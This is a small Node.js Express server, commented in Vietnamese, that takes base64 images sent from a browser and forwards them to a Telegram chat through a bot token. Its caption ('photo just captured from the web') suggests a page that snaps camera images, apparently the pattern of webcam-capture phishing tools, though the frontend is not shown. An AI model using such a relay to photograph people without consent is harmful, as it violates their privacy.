require('dotenv').config();
const express = require('express');
const axios = require('axios');
const cors = require('cors');
const bodyParser = require('body-parser');
const FormData = require('form-data');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;
const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

app.use(cors());
app.use(bodyParser.json({ limit: '10mb' }));
app.use(express.static(path.join(__dirname, 'public')));

// Route nhận ảnh từ trình duyệt và gửi lên Telegram
app.post('/upload', async (req, res) => {
    try {
        const { image } = req.body;
        if (!image) {
            return res.status(400).json({ error: 'Không có ảnh' });
        }

        const base64Data = image.replace(/^data:image\/\w+;base64,/, '');
        const buffer = Buffer.from(base64Data, 'base64');

        const form = new FormData();
        form.append('chat_id', CHAT_ID);
        form.append('photo', buffer, { filename: 'capture.png' });
        form.append('caption', '📸 Ảnh vừa được chụp từ web!');

        await axios.post(
            `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,
            form,
            { headers: form.getHeaders() }
        );

        res.json({ success: true });
    } catch (error) {
        console.error('Lỗi:', error.response?.data || error.message);
        res.status(500).json({ error: 'Gửi ảnh thất bại' });
    }
});

// Route kiểm tra server còn sống
app.get('/health', (req, res) => {
    res.json({ status: 'ok', time: new Date().toISOString() });
});

app.listen(PORT, () => {
    console.log(`✅ Server chạy tại port ${PORT}`);
});
